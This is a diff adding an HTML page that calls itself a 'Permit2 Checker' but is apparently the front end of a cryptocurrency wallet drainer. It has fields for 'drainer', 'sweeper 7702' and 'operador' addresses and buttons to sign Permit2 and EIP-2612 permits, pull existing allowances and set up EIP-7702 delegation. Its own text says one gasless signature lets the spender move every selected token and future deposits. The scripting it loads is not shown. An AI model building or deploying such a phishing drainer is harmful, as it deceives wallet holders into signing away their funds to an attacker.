@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Permit2 Checker</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <main>
+    <header>
+      <h1>Permit2 <span>checker</span></h1>
+      <p class="sub">permit2 · eip-2612 · eip-7702</p>
+    </header>
+
+    <section class="card">
+      <div class="grid">
+        <label>RPC <input id="rpc" value="https://ethereum-rpc.publicnode.com" /></label>
+        <label>drainer <input id="drainer" placeholder="0x..." /></label>
+        <label>sweeper 7702 <input id="sweeper" placeholder="0x..." /></label>
+        <label>operador <input id="operator" placeholder="0x..." /></label>
+      </div>
+      <div class="row">
+        <button id="connect" class="primary">1. Connect wallet</button>
+        <button id="scan">Rescan</button>
+        <span id="who" class="mono"></span>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="row between">
+        <h2>Portfolio</h2>
+        <span id="native" class="mono"></span>
+      </div>
+      <table id="table">
+        <thead><tr><th><input id="all" type="checkbox" /></th><th>token</th><th>balance</th><th>approved</th><th>nonce</th></tr></thead>
+        <tbody></tbody>
+      </table>
+      <div class="row">
+        <button id="permit2" class="primary">2. Sign Permit2 (no gas)</button>
+        <button id="p2612">Sign 2612 permit</button>
+        <button id="pull">Pull existing allowance</button>
+        <button id="delegate">Delegate 7702 + init</button>
+      </div>
+      <p class="sub">One signature lets the spender move every selected token — no gas, no transaction. Permit2 covers them all at once, plus future deposits (native ETH only via 7702 delegation).</p>
+    </section>
+
+    <section class="card">
+      <h2>Log</h2>
+      <pre id="log"></pre>
+    </section>
+  </main>
+  <script type="module" src="/app.js"></script>
+</body>
+</html>
